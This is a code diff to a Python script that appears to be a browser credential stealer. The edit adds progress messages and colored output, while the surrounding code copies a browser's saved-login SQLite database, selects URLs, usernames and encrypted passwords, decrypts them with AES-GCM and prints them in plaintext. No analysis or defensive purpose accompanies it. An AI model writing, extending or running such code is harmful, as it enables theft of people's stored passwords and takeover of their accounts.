@@ -88,26 +88,41 @@ def decrypt_key(encrypted_key):
     return decrypted_key
 
 def login_data_parser(login_data_path, decryption_key):
+
+    print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Parsing password data.")
+
     try:
+    
         temp_login_data_path = login_data_path + 'a'
         shutil.copyfile(login_data_path, temp_login_data_path)
         
         conn = sqlite3.connect(temp_login_data_path)
+        
+        print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Connected to SQL database.")
+        
         cursor = conn.cursor()
+        
+        print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Created cursor.")
+        
         cursor.execute("SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins")
+        
+        print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Executed username and password retrieval query.")
 
         for row in cursor.fetchall():
+        
             origin_url, username_value, encrypted_password, blacklisted_by_user = row
+            
             if origin_url and username_value and not blacklisted_by_user:
+            
                 iv = encrypted_password[3:15]
                 encrypted_password = encrypted_password[15:]
                 
                 cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
                 decrypted_password = cipher.decrypt(encrypted_password).decode('utf-8')
                 
-                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Origin URL: {origin_url}")
-                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Username Value: {username_value}")
-                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Password: {decrypted_password}")
+                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] URL: [{bcolors.OKCYAN}" + origin_url + f"{bcolors.ENDC}]")
+                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Username: [{bcolors.OKCYAN}" + username_value + f"{bcolors.ENDC}]")
+                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Password: [{bcolors.OKCYAN}" + decrypted_password + f"{bcolors.ENDC}]")
                 print("----------------------------------")
         
         conn.close()
